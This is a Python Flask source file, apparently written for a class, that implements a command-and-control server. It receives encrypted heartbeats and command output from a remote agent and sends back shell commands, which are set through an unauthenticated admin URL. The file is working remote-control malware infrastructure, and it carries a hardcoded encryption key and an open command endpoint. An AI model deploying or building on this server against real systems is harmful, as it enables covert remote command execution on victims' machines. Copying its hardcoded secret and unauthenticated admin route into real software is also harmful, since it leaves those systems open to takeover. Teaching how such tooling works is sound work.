from flask import Flask, request, jsonify
from cryptography.fernet import Fernet

app = Flask(__name__)

# GENERATE A KEY: In a real project, you'd save this to a file.
# For the class, just make sure both files have the SAME string.
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
cipher = Fernet(SECRET_KEY)

# This variable holds the command you want the agent to run.
# In a real tool, you'd use a database, but for a class, this works!
current_command = "none"

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        """
        This is the 'Heartbeat' endpoint. 
        The agent sends its system info here.
        """
        encrypted_data = request.data

        decrypted_data = cipher.decrypt(encrypted_data).decode()
        print(f"[*] Secure Heartbeat: {decrypted_data}")
        
        # Send the current pending command back to the agent
        encrypted_command = cipher.encrypt(current_command.encode())
        return encrypted_command
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 400

@app.route('/result', methods=['POST'])
def get_result():
    try:
        """
        The agent sends the command output here.
        """
        encrypted_output = request.data
        decrypted_output = cipher.decrypt(encrypted_output).decode()

        print(f"\n--- Decrypted Command Result ---\n{decrypted_output}\n----------------------")
        
        # Reset the command to 'none' so it doesn't run in a loop
        global current_command
        current_command = "none"
        return "OK", 200
    except Exception as e:
        print(f"[!] Error decrypting the result: {e}")
        return "Error", 400

@app.route('/admin/set_cmd/<new_cmd>')
def set_command(new_cmd):
    """
    A simple way for YOU to set a command.
    Example: Visit http://localhost:5000/admin/set_cmd/whoami in your browser
    """
    global current_command
    # Replace '+' with spaces so you can type multi-word commands in the URL
    current_command = new_cmd.replace('+', ' ')
    print(f"[*] Next command set to: {current_command}")
    return f"Command set to: {current_command}"

if __name__ == "__main__":
    # We run on 5000. Nginx will 'talk' to this port later.
    app.run(host='0.0.0.0', port=5000)